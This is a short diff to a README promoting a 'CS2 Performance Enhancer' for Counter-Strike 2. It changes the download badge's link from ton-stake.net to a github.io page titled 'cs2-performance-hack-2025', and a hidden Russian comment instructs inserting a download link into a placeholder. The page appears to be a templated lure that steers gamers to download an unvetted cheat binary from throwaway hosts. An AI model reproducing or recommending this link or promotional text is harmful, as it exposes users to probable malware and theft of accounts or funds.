@@ -5,7 +5,7 @@ Welcome to the **next evolution** in Counter-Strike 2 gameplay. The **CS2 Perfor
 Created for both **casual gamers** and **pro competitors**, this enhancer offers a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
 <!-- ПОДСКАЗКА НА РУССКОМ: Вставьте ссылку на страницу или файл для скачивания enhancer (например, https://example.com/download) вместо INSERT_DOWNLOAD_LINK_HERE -->
-[![Download Performance Enhancer](https://img.shields.io/badge/Download-CS2_Performance_Enhancer-purple)](https://ton-stake.net)
+[![Download Performance Enhancer](https://img.shields.io/badge/Download-CS2_Performance_Enhancer-purple)](https://cs2-performance-hack-2025.github.io/.github/)
 
 ---
 
